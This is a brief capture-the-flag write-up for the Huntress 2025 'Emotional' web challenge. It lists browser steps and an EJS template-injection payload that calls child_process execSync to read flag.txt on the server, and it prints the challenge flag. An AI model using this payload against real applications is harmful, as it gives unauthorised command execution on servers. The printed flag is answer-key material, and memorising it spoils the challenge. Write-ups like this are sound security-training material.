---
title: "Huntress_2025 – Emotional"
layout: post
competition: Huntress_2025
challenge: Emotional
---

# 🌐 Emotional

|Category         |	Author                |
|-----------------|-----------------------|
|🌐 Web           |John Hammond           |

## Challenge Prompt

Don't be shy, show your emotions! Get emotional if you have to! Uncover the flag.

## Problem Type
- Web command injection

## Solve
Press F12

Run an emoji change

Right click to edit and resend

`Emoji=<%= process.mainModule.require('child_process').execSync('cat flag.txt').toString() %>`

F5 to refresh

Check the response panel for flag

## Flag
`flag{8c8e0e59d1292298b64c625b401e8cfa}`


<p align="right">(<a href="#top">back to top</a>)</p>
